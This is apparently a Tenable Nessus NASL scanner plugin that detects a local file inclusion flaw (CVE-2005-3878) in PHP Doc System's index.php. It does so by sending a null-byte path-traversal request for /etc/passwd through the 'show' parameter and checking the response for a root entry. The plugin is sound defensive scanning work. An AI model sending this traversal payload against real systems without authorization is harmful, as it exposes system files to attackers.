#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20246);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-3878");
  script_bugtraq_id(15611);

  script_name(english:"PHP Doc System index.php show Parameter Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running PHP Doc System, a modular, PHP-based system
for creating documentation. 

The version of PHP Doc System installed on the remote host fails to
sanitize user input to the 'show' parameter of the 'index.php' script
before using it in a PHP 'include' function.  An unauthenticated
attacker may be able to exploit this issue to view arbitrary files on
the remote host or to execute arbitrary PHP code taken from arbitrary
files on the remote host.");
  # http://web.archive.org/web/20070529032745/http://pridels.blogspot.com/2005/11/php-doc-system-151-local-file.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a55147a0");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:alex_king:php_doc_system");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/documentation", "/docs", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read /etc/passwd.
  file = "../../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "show=", file
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    contents = res - strstr(res, "<br />");
    if (!strlen(contents)) contents = res;
    contents = data_protection::redact_etc_passwd(output:contents);
    report = string(
      "\n",
      contents
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
}
